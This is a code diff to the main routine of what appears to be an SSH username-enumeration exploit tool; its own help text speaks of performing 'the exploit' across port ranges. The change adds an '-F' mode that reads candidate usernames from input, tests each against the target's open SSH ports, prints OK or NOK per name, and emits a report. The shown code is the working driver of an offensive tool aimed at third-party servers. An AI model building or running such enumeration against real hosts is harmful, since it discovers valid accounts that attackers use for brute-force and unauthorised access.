@@ -45,9 +45,9 @@ int main(int argc, char **argv){
     unsigned int      timeout               = inet::STD_SEC_DELAY;
 
    #ifndef NOTRACE
-   const char         flags[] = "snt:m:M:r:c:p:i:hV";
+   const char         flags[] = "F:snt:m:M:r:c:p:i:hV";
    #else
-   const char         flags[] = "snt:m:M:r:c:p:i:hdV";
+   const char         flags[] = "F:snt:m:M:r:c:p:i:hdV";
    #endif
 
    ParseCmdLine pcl(argc, argv, flags);
@@ -79,6 +79,9 @@ int main(int argc, char **argv){
    
    if(pcl.isSet('n') && !pcl.isSet('s'))
       paramError(argv[0], "-n parameter requires -s .");
+   
+   if(pcl.isSet('n') && pcl.isSet('F'))
+      paramError(argv[0], "-n parameter is not compatible with -F .");
    
    if(pcl.isSet('t') && !pcl.isSet('s'))
       paramError(argv[0], "-t parameter requires -s .");
@@ -167,7 +170,7 @@ int main(int argc, char **argv){
            currPort++;
       } while(currPort < endPort);
 
-      if(!pcl.isSet('n') && !verifiedPorts.empty()){
+      if(!pcl.isSet('n') && !pcl.isSet('F') && !verifiedPorts.empty()){
           while( getline(cin, usr) ){
              if(!usr.empty()){
                 for(auto it = verifiedPorts.begin(); it != verifiedPorts.end(); ++it){
@@ -179,6 +182,21 @@ int main(int argc, char **argv){
                 }
              }
           }
+      }else if(pcl.isSet('F') && !verifiedPorts.empty()){
+          SshConnectionFprint::init(pcl.getValue('F'));
+          while( getline(cin, usr) ){
+             if(!usr.empty()){
+                for(auto it = verifiedPorts.begin(); it != verifiedPorts.end(); ++it){
+                    SshConnectionFprint::insertUser(usr);
+                    SshConnectionFprint ssh(usr, host, *it, identityFile);
+                    if(ssh.checkUsr())
+                        cout << usr << ":OK" << endl;
+                    else
+                        cout << usr << ":NOK" << endl;
+                }
+             }
+          }
+          SshConnectionFprint::getReport();
       }else{
           cout << "No verified port or -n flag specified in cdm line." << endl;
       }
@@ -216,7 +234,7 @@ void paramError(const char* progname, const char* err) noexcept{
         << "       " << "-s scan mode try to perform the exploit on a range of port."            << endl 
         << "       " << "   If -m and -M are not specified, the range 1-65535 will be "          << endl 
         << "       " << "   employed."                                                           << endl 
-        << "       " << "-n only scan the target to individuare ssh port(s) "                    << endl 
+        << "       " << "-n only scan the target to individuate ssh port(s) "                    << endl 
         << "       " << "   No user enumeration is performed."                                   << endl 
         << "       " << "-m lower port for scan mode: the scan will be performed"                << endl 
         << "       " << "   starting from this port number to that specified with -M"            << endl 
